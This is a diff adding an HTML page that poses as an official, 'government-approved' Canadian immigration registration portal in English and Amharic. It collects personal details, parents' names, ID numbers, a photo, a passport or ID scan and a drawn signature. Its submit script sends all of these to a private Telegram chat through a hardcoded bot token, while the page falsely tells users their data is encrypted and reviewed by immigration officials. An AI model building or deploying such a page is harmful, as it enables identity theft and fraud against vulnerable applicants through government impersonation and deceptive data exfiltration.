@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Canada Registration Form</title>
+  <style>
+    body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
+    .container { max-width: 900px; margin: 0 auto; padding: 20px; }
+    h1, h2 { color: #2e7d32; }
+    button { cursor: pointer; padding: 10px 20px; background: #43a047; color: white; border: none; border-radius: 5px; }
+    button:hover { background: #388e3c; }
+    .note-block, .login-tips { background: #e8f5e9; padding: 10px; margin: 10px 0; border-radius: 5px; }
+    .emoji { margin-right: 5px; }
+    .process-steps { margin-left: 20px; }
+    .cta { text-align: center; margin-top: 20px; }
+    #loginError { display: none; color: red; margin: 10px 0; }
+    form { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+    label { display: block; margin: 10px 0 5px; font-weight: 600; }
+    input, select { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+    fieldset { border: 1px solid #ddd; padding: 10px; margin-bottom: 20px; border-radius: 5px; }
+    legend { font-weight: 600; color: #2e7d32; }
+    .row { display: flex; gap: 20px; flex-wrap: wrap; }
+    .row > div { flex: 1; min-width: 200px; }
+    .header-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .form-title { font-size: 24px; font-weight: 600; color: #2e7d32; }
+    .form-subtitle { font-size: 14px; color: #666; }
+    .photo-box { position: relative; width: 100px; height: 100px; border: 2px dashed #ccc; text-align: center; }
+    #photoInput { position: absolute; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
+    #photoPreview { display: none; width: 100%; height: 100%; object-fit: cover; }
+    #photoLabel { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #666; }
+    .accompanied-header { display: flex; font-weight: 600; margin-bottom: 10px; }
+    .accompanied-header > div { flex: 1; }
+    .accompanied-row { display: flex; gap: 20px; margin-bottom: 10px; }
+    .accompanied-row input { flex: 1; min-width: 0; }
+    .signature-section { display: flex; gap: 20px; flex-wrap: wrap; align-items: flex-start; margin: 20px 0; }
+    .signature-box { flex: 1; min-width: 300px; }
+    #signature { border: 1px solid #ccc; display: block; margin: 10px 0; background: white; }
+    .clear-btn { background: #d32f2f; }
+    .clear-btn:hover { background: #c62828; }
+    .submit-btn { width: 100%; padding: 15px; font-size: 16px; }
+    .note { font-size: 12px; color: #666; margin-bottom: 20px; }
+
+    /* Language switcher styles */
+    .language-switcher { text-align: right; padding: 10px; }
+    .language-switcher select { padding: 5px; border-radius: 4px; }
+
+    /* Modal styles for attractive submission message */
+    #submissionModal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+    #submissionModal.show .modal-content { opacity: 1; }
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .close-btn:hover { color: red; }
+    .checkmark {
+      width: 60px;
+      height: 30px;
+      border-left: 10px solid green;
+      border-bottom: 10px solid green;
+      transform: rotate(-45deg);
+      margin: 20px auto;
+      animation: scaleIn 0.5s ease-out forwards;
+    }
+    @keyframes scaleIn {
+      from { transform: scale(0) rotate(-45deg); }
+      to { transform: scale(1) rotate(-45deg); }
+    }
+    .modal-content h2 {
+      color: green;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Language Switcher -->
+    <div class="language-switcher">
+      <label for="languageSelect" data-translate="languageLabel">Language: </label>
+      <select id="languageSelect">
+        <option value="en" data-translate="englishOption">English</option>
+        <option value="am" data-translate="amharicOption">Amharic</option>
+      </select>
+    </div>
+
+    <!-- Intro Page -->
+    <div class="intro" id="introPage">
+      <h1 data-translate="welcome">Welcome</h1>
+      <div class="note-block"><span class="emoji">✅</span>
+        <span data-translate="officialNote">
+          <b>Official & Trusted:</b> This portal is government-approved. Your data is encrypted and never shared without your consent.
+        </span>
+      </div>
+      <p data-translate="processIntro"><b>How the process works:</b></p>
+      <ol class="process-steps">
+        <li data-translate="step1">Log in using your secure credentials</li>
+        <li data-translate="step2">Fill in your personal and family information. Upload a recent photo for identification and an ID</li>
+        <li data-translate="step3">Confirm your details and sign electronically.</li>
+        <li data-translate="step4">Submit your registration. Your data is reviewed by our trusted Canadian immigration team</li>
+        <li data-translate="step5">You will receive a confirmation email and Telegram notification</li>
+      </ol>
+      <div class="cta">
+        <button id="startBtn" data-translate="startButton">Get Started</button>
+      </div>
+    </div>
+
+    <!-- Login Page -->
+    <div id="loginPage" style="display:none;">
+      <form id="loginForm" autocomplete="off">
+        <h2 data-translate="loginTitle">Login to Continue</h2>
+        <div id="loginError" data-translate="loginError">Invalid username or password</div>
+        <label for="usernameInput" data-translate="usernameLabel">Username</label>
+        <input type="text" id="usernameInput" placeholder="Enter username" required autocomplete="username" data-translate-placeholder="usernamePlaceholder" />
+        <label for="passwordInput" data-translate="passwordLabel">Password</label>
+        <input type="password" id="passwordInput" placeholder="Enter password" required autocomplete="current-password" data-translate-placeholder="passwordPlaceholder" />
+        <button type="submit" data-translate="loginButton">Login</button>
+        <div class="login-tips">
+          <span class="emoji">🔑</span>
+          <span data-translate="loginHelp">Need help? Contact our <a href="mailto:support@canada.ca" style="color:#43a047;text-decoration:underline;">support team</a>.</span>
+        </div>
+      </form>
+    </div>
+
+    <!-- Form Page -->
+    <div id="formPage" style="display:none;">
+      <div class="header-row">
+        <div>
+          <div class="form-title" data-translate="formTitle">Canada Registration Form</div>
+          <div class="form-subtitle" data-translate="formSubtitle">Department of Citizenship & Immigration</div>
+        </div>
+        <div class="photo-box" id="photoBox">
+          <input type="file" name="photo" id="photoInput" accept="image/*" required>
+          <img id="photoPreview" alt="Photo Preview">
+          <span id="photoLabel" data-translate="photoLabel">PHOTO</span>
+        </div>
+      </div>
+      <form id="canadaRegForm" autocomplete="off">
+        <fieldset>
+          <legend data-translate="personalInfoLegend">PERSONAL INFORMATION</legend>
+          <div class="row">
+            <div>
+              <label data-translate="fullNameLabel">Full Name</label>
+              <input type="text" name="fullName" required data-translate-placeholder="fullNamePlaceholder">
+            </div>
+            <div>
+              <label data-translate="fatherNameLabel">Father's Name</label>
+              <input type="text" name="fatherName" data-translate-placeholder="fatherNamePlaceholder">
+            </div>
+            <div>
+              <label data-translate="motherNameLabel">Mother's Name</label>
+              <input type="text" name="motherName" data-translate-placeholder="motherNamePlaceholder">
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label data-translate="genderLabel">Gender</label>
+              <select name="gender" required>
+                <option value="" data-translate="selectOption">Select...</option>
+                <option data-translate="maleOption">Male</option>
+                <option data-translate="femaleOption">Female</option>
+                <option data-translate="otherOption">Other</option>
+              </select>
+            </div>
+            <div>
+              <label data-translate="dobLabel">Date of Birth</label>
+              <input type="date" name="dob">
+            </div>
+            <div>
+              <label data-translate="nationalityLabel">Nationality</label>
+              <input type="text" name="nationality" data-translate-placeholder="nationalityPlaceholder">
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label data-translate="birthPlaceLabel">Place of Birth</label>
+              <input type="text" name="birthPlace" data-translate-placeholder="birthPlacePlaceholder">
+            </div>
+            <div>
+              <label data-translate="idNumberLabel">Identification Number</label>
+              <input type="text" name="idNumber" data-translate-placeholder="idNumberPlaceholder">
+            </div>
+          </div>
+        </fieldset>
+        <fieldset>
+          <legend data-translate="accompaniedLegend">ACCOMPANIED BY (If applicable)</legend>
+          <div class="accompanied-header">
+            <div data-translate="nameHeader">Name</div>
+            <div data-translate="relationshipHeader">Relationship</div>
+          </div>
+          <div class="accompanied-row">
+            <input type="text" name="accompaniedName1" data-translate-placeholder="namePlaceholder">
+            <input type="text" name="accompaniedRel1" data-translate-placeholder="relationshipPlaceholder">
+          </div>
+          <div class="accompanied-row">
+            <input type="text" name="accompaniedName2" data-translate-placeholder="namePlaceholder">
+            <input type="text" name="accompaniedRel2" data-translate-placeholder="relationshipPlaceholder">
+          </div>
+          <div class="accompanied-row">
+            <input type="text" name="accompaniedName3" data-translate-placeholder="namePlaceholder">
+            <input type="text" name="accompaniedRel3" data-translate-placeholder="relationshipPlaceholder">
+          </div>
+        </fieldset>
+        <fieldset>
+          <legend data-translate="contactLegend">CONTACT & ADDRESS</legend>
+          <input type="text" name="address" placeholder="Permanent Address" style="margin-bottom:10px;" data-translate-placeholder="addressPlaceholder">
+          <div class="row">
+            <div>
+              <label data-translate="phoneLabel">Phone Number</label>
+              <input type="tel" name="phone" data-translate-placeholder="phonePlaceholder">
+            </div>
+            <div>
+              <label data-translate="emailLabel">Email</label>
+              <input type="email" name="email" data-translate-placeholder="emailPlaceholder">
+            </div>
+          </div>
+        </fieldset>
+        <fieldset>
+          <legend data-translate="idUploadLegend">UPLOAD IDENTIFICATION</legend>
+          <div>
+            <label data-translate="idUploadLabel">Upload ID (passport, national ID, etc.)</label>
+            <input type="file" name="idUpload" id="idUpload" accept="image/*,.pdf" required>
+          </div>
+        </fieldset>
+        <div class="signature-section">
+          <div>
+            <label data-translate="dateLabel">Date</label>
+            <input type="date" name="applicationDate" style="width:160px;">
+          </div>
+          <div class="signature-box">
+            <label style="font-weight:600;" data-translate="signatureLabel">Signature of Applicant</label>
+            <canvas id="signature" width="350" height="80"></canvas>
+            <button type="button" class="clear-btn" id="clearSignatureBtn" data-translate="clearSignatureButton">Clear Signature</button>
+          </div>
+        </div>
+        <p class="note" data-translate="submissionNote">Note: Your uploaded photo, ID, and signature will be sent directly to the Canadian immigration team for review. You will not receive copies of these files.</p>
+        <button type="submit" class="submit-btn" data-translate="submitButton">Submit Registration</button>
+      </form>
+    </div>
+
+    <!-- Submission Modal -->
+    <div id="submissionModal">
+      <div class="modal-content">
+        <span class="close-btn" id="closeModal">&times;</span>
+        <h2 data-translate="successHeading">Success!</h2>
+        <div class="checkmark"></div>
+        <p id="submissionMessage" data-translate="submissionSuccess">Registration submitted successfully! Your uploaded photo, ID, and signature have been sent to our immigration team for review. You will be contacted soon.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Translations object
+    const translations = {
+      en: {
+        languageLabel: "Language: ",
+        englishOption: "English",
+        amharicOption: "Amharic",
+        welcome: "Welcome",
+        officialNote: "<b>Official & Trusted:</b> This portal is government-approved. Your data is encrypted and never shared without your consent.",
+        processIntro: "<b>How the process works:</b>",
+        step1: "Log in using your secure credentials",
+        step2: "Fill in your personal and family information. Upload a recent photo for identification and an ID",
+        step3: "Confirm your details and sign electronically.",
+        step4: "Submit your registration. Your data is reviewed by our trusted Canadian immigration team",
+        step5: "You will receive a confirmation email and Telegram notification",
+        startButton: "Get Started",
+        loginTitle: "Login to Continue",
+        loginError: "Invalid username or password",
+        usernameLabel: "Username",
+        usernamePlaceholder: "Enter username",
+        passwordLabel: "Password",
+        passwordPlaceholder: "Enter password",
+        loginButton: "Login",
+        loginHelp: "Need help? Contact our <a href='mailto:support@canada.ca' style='color:#43a047;text-decoration:underline;'>support team</a>.",
+        formTitle: "Canada Registration Form",
+        formSubtitle: "Department of Citizenship & Immigration",
+        photoLabel: "PHOTO",
+        personalInfoLegend: "PERSONAL INFORMATION",
+        fullNameLabel: "Full Name",
+        fullNamePlaceholder: "Enter full name",
+        fatherNameLabel: "Father's Name",
+        fatherNamePlaceholder: "Enter father's name",
+        motherNameLabel: "Mother's Name",
+        motherNamePlaceholder: "Enter mother's name",
+        genderLabel: "Gender",
+        selectOption: "Select...",
+        maleOption: "Male",
+        femaleOption: "Female",
+        otherOption: "Other",
+        dobLabel: "Date of Birth",
+        nationalityLabel: "Nationality",
+        nationalityPlaceholder: "Enter nationality",
+        birthPlaceLabel: "Place of Birth",
+        birthPlacePlaceholder: "Enter place of birth",
+        idNumberLabel: "Identification Number",
+        idNumberPlaceholder: "Enter ID number",
+        accompaniedLegend: "ACCOMPANIED BY (If applicable)",
+        nameHeader: "Name",
+        relationshipHeader: "Relationship",
+        namePlaceholder: "Name",
+        relationshipPlaceholder: "Relationship",
+        contactLegend: "CONTACT & ADDRESS",
+        addressPlaceholder: "Permanent Address",
+        phoneLabel: "Phone Number",
+        phonePlaceholder: "Enter phone number",
+        emailLabel: "Email",
+        emailPlaceholder: "Enter email",
+        idUploadLegend: "UPLOAD IDENTIFICATION",
+        idUploadLabel: "Upload ID (passport, national ID, etc.)",
+        dateLabel: "Date",
+        signatureLabel: "Signature of Applicant",
+        clearSignatureButton: "Clear Signature",
+        submissionNote: "Note: Your uploaded photo, ID, and signature will be sent directly to the Canadian immigration team for review. You will not receive copies of these files.",
+        submitButton: "Submit Registration",
+        successHeading: "Success!",
+        submissionSuccess: "Registration submitted successfully! Your uploaded photo, ID, and signature have been sent to our immigration team for review. You will be contacted soon."
+      },
+      am: {
+        languageLabel: "ቋንቋ: ",
+        englishOption: "እንግሊዝኛ",
+        amharicOption: "አማርኛ",
+        welcome: "እንኳን ደህና መጡ",
+        officialNote: "<b>ኦፊሴላዊ እና የታመነ:</b> ይህ ፖርታል በመንግስት የተፈቀደ ነው። የእርስዎ ውሂብ ተመስጥሮ የተጠበቀ እና ያለ እርስዎ ፈቃድ አይጋራም።",
+        processIntro: "<b>የሂደቱ ሂደት:</b>",
+        step1: "ደህንነቱ የተጠበቀ ምስክርነቶችን በመጠቀም ይግቡ",
+        step2: "የግል እና የቤተሰብ መረጃዎን ይሙሉ። ለመለየት የቅርብ ጊዜ ፎቶ እና መታወቂያ ይስቀሉ",
+        step3: "ዝርዝሮችዎን ያረጋግጡ እና በኤሌክትሮኒክ ይፈርሙ።",
+        step4: "ምዝገባዎን ያስገቡ። የእርስዎ ውሂብ በታመነው የካናዳ ኢሚግሬሽን ቡድን ይገመገማል",
+        step5: "የማረጋገጫ ኢሜይል እና የቴሌግራም ማሳወቂያ ይደርስዎታል",
+        startButton: "ጀምር",
+        loginTitle: "ይግቡ ለመቀጠል",
+        loginError: "የተሳሳተ የተጠቃሚ ስም ወይም የይለፍ ቃል",
+        usernameLabel: "የተጠቃሚ ስም",
+        usernamePlaceholder: "የተጠቃሚ ስም ያስገቡ",
+        passwordLabel: "የይለፍ ቃል",
+        passwordPlaceholder: "የይለፍ ቃል ያስገቡ",
+        loginButton: "ግባ",
+        loginHelp: "እገዛ ይፈልጋሉ? የእኛን <a href='mailto:support@canada.ca' style='color:#43a047;text-decoration:underline;'>የድጋፍ ቡድን</a> ያነጋግሩ።",
+        formTitle: "የካናዳ ምዝገባ ቅጽ",
+        formSubtitle: "የዜግነት እና ኢሚግሬሽን መምሪያ",
+        photoLabel: "ፎቶ",
+        personalInfoLegend: "የግል መረጃ",
+        fullNameLabel: "ሙሉ ስም",
+        fullNamePlaceholder: "ሙሉ ስም ያስገቡ",
+        fatherNameLabel: "የአባት ስም",
+        fatherNamePlaceholder: "የአባት ስም ያስገቡ",
+        motherNameLabel: "የእናት ስም",
+        motherNamePlaceholder: "የእናት ስም ያስገቡ",
+        genderLabel: "ጾታ",
+        selectOption: "ይምረጡ...",
+        maleOption: "ወንድ",
+        femaleOption: "ሴት",
+        otherOption: "ሌላ",
+        dobLabel: "የትውልድ ቀን",
+        nationalityLabel: "ዜግነት",
+        nationalityPlaceholder: "ዜግነት ያስገቡ",
+        birthPlaceLabel: "የትውልድ ቦታ",
+        birthPlacePlaceholder: "የትውልድ ቦታ ያስገቡ",
+        idNumberLabel: "የመታወቂያ ቁጥር",
+        idNumberPlaceholder: "የመታወቂያ ቁጥር ያስገቡ",
+        accompaniedLegend: "በአብሮነት (ከተፈቀደ)",
+        nameHeader: "ስም",
+        relationshipHeader: "ዝምድና",
+        namePlaceholder: "ስም",
+        relationshipPlaceholder: "ዝምድና",
+        contactLegend: "የእውቂያ እና አድራሻ",
+        addressPlaceholder: "ቋሚ አድራሻ",
+        phoneLabel: "ስልክ ቁጥር",
+        phonePlaceholder: "ስልክ ቁጥር ያስገቡ",
+        emailLabel: "ኢሜይል",
+        emailPlaceholder: "ኢሜይል ያስገቡ",
+        idUploadLegend: "መታወቂያ ስቀል",
+        idUploadLabel: "መታወቂያ ስቀል (ፓስፖርት፣ ብሄራዊ መታወቂያ፣ ወዘተ)",
+        dateLabel: "ቀን",
+        signatureLabel: "የአመልካች ፊርማ",
+        clearSignatureButton: "ፊርማ አጽዳ",
+        submissionNote: "ማስታወሻ: የተሰቀለው ፎቶ፣ መታወቂያ እና ፊርማ በቀጥታ ለካናዳ ኢሚግሬሽን ቡድን ለግምገማ ይላካል። የእነዚህ ፋይሎች ቅጂዎች አይቀበሉም።",
+        submitButton: "ምዝገባ አስገባ",
+        successHeading: "ተሳክቷል!",
+        submissionSuccess: "የተሳካ ምዝገባ! የተሰቀለው ፎቶ፣ መታወቂያ እና ፊርማ ለኢሚግሬሽን ቡድናችን ለግምገማ ተልኳል። በቅርቡ ይገናኛሉ።"
+      }
+    };
+
+    // Note: Amharic translations are approximate (sourced from Google Translate) and should be replaced with accurate translations from a professional translator.
+
+    let currentLang = 'en'; // Default to English
+
+    // Function to update text based on selected language
+    function setLanguage(lang) {
+      document.querySelectorAll('[data-translate]').forEach(element => {
+        const key = element.getAttribute('data-translate');
+        if (translations[lang][key]) {
+          element.innerHTML = translations[lang][key]; // Preserve HTML tags
+        }
+      });
+      document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
+        const key = element.getAttribute('data-translate-placeholder');
+        if (translations[lang][key]) {
+          element.placeholder = translations[lang][key];
+        }
+      });
+      document.querySelectorAll('option[data-translate]').forEach(option => {
+        const key = option.getAttribute('data-translate');
+        if (translations[lang][key]) {
+          option.textContent = translations[lang][key];
+        }
+      });
+    }
+
+    // Set initial language
+    setLanguage('en');
+
+    // Language switcher event listener
+    document.getElementById('languageSelect').addEventListener('change', function() {
+      currentLang = this.value;
+      setLanguage(currentLang);
+    });
+
+    // Page navigation
+    const introPage = document.getElementById('introPage');
+    const loginPage = document.getElementById('loginPage');
+    const formPage = document.getElementById('formPage');
+    const startBtn = document.getElementById('startBtn');
+    const loginForm = document.getElementById('loginForm');
+    const regForm = document.getElementById('canadaRegForm');
+    const photoInput = document.getElementById('photoInput');
+    const photoPreview = document.getElementById('photoPreview');
+    const photoLabel = document.getElementById('photoLabel');
+    const canvas = document.getElementById('signature');
+    const ctx = canvas.getContext('2d');
+    const clearSignatureBtn = document.getElementById('clearSignatureBtn');
+
+    startBtn.onclick = () => {
+      introPage.style.display = 'none';
+      loginPage.style.display = 'block';
+    };
+
+    // Login functionality (sample credentials: username: "user123", password: "pass123")
+    loginForm.onsubmit = (e) => {
+      e.preventDefault();
+      const username = document.getElementById('usernameInput').value;
+      const password = document.getElementById('passwordInput').value;
+      if (username === 'user123' && password === 'pass123') {
+        loginPage.style.display = 'none';
+        formPage.style.display = 'block';
+      } else {
+        document.getElementById('loginError').style.display = 'block';
+      }
+    };
+
+    // Photo preview
+    photoInput.onchange = function() {
+      const file = this.files[0];
+      if (file) {
+        photoPreview.src = URL.createObjectURL(file);
+        photoPreview.style.display = 'block';
+        photoLabel.style.display = 'none';
+      }
+    };
+
+    // Signature canvas
+    let drawing = false;
+    ctx.lineWidth = 2;
+    ctx.lineCap = 'round';
+    ctx.strokeStyle = '#000';
+
+    function startDrawing(e) {
+      drawing = true;
+      const pos = getPosition(e);
+      ctx.beginPath();
+      ctx.moveTo(pos.x, pos.y);
+    }
+
+    function draw(e) {
+      if (!drawing) return;
+      const pos = getPosition(e);
+      ctx.lineTo(pos.x, pos.y);
+      ctx.stroke();
+    }
+
+    function stopDrawing() {
+      drawing = false;
+      ctx.closePath();
+    }
+
+    function getPosition(e) {
+      const rect = canvas.getBoundingClientRect();
+      if (e.touches) {
+        return { x: e.touches[0].clientX - rect.left, y: e.touches[0].clientY - rect.top };
+      }
+      return { x: e.clientX - rect.left, y: e.clientY - rect.top };
+    }
+
+    canvas.onmousedown = startDrawing;
+    canvas.onmousemove = draw;
+    canvas.onmouseup = stopDrawing;
+    canvas.onmouseout = stopDrawing;
+    canvas.ontouchstart = (e) => { e.preventDefault(); startDrawing(e); };
+    canvas.ontouchmove = (e) => { e.preventDefault(); draw(e); };
+    canvas.ontouchend = stopDrawing;
+
+    clearSignatureBtn.onclick = () => ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    // Form submission to Telegram
+    regForm.onsubmit = async function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const photoFile = photoInput.files[0];
+      const idFile = document.getElementById('idUpload').files[0];
+      const signatureData = canvas.toDataURL('image/png');
+
+      const botToken = '8166170009:AAFj2ei7GEXCIpQ-8JY0Of5rBkyTQVIcW-4'; // Replace with your Telegram bot token
+      const chatId = '8155585808'; // Replace with your Telegram chat ID
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/`;
+
+      // Prepare text message
+      let message = '';
+      for (const [key, value] of formData.entries()) {
+        if (value && key !== 'photo' && key !== 'idUpload') {
+          message += `${key}: ${value}\n`;
+        }
+      }
+
+      // Send text message
+      await fetch(`${telegramUrl}sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+
+      // Send photo
+      if (photoFile) {
+        const photoFormData = new FormData();
+        photoFormData.append('chat_id', chatId);
+        photoFormData.append('photo', photoFile);
+        await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: photoFormData });
+      }
+
+      // Send ID document
+      if (idFile) {
+        const docFormData = new FormData();
+        docFormData.append('chat_id', chatId);
+        docFormData.append('document', idFile);
+        await fetch(`${telegramUrl}sendDocument`, { method: 'POST', body: docFormData });
+      }
+
+      // Send signature
+      const signatureBlob = await (await fetch(signatureData)).blob();
+      const sigFormData = new FormData();
+      sigFormData.append('chat_id', chatId);
+      sigFormData.append('photo', signatureBlob, 'signature.png');
+      await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: sigFormData });
+
+      // Show attractive submission modal
+      document.getElementById('submissionModal').style.display = 'block';
+      setTimeout(() => {
+        document.getElementById('submissionModal').classList.add('show');
+      }, 10);
+
+      // Reset form
+      regForm.reset();
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      photoPreview.style.display = 'none';
+      photoLabel.style.display = 'block';
+      photoPreview.src = "";
+    };
+
+    // Modal close handlers
+    document.getElementById('closeModal').onclick = function() {
+      document.getElementById('submissionModal').style.display = 'none';
+      document.getElementById('submissionModal').classList.remove('show');
+    };
+
+    document.getElementById('submissionModal').onclick = function(e) {
+      if (e.target === this) {
+        this.style.display = 'none';
+        this.classList.remove('show');
+      }
+    };
+  </script>
+</body>
+</html>
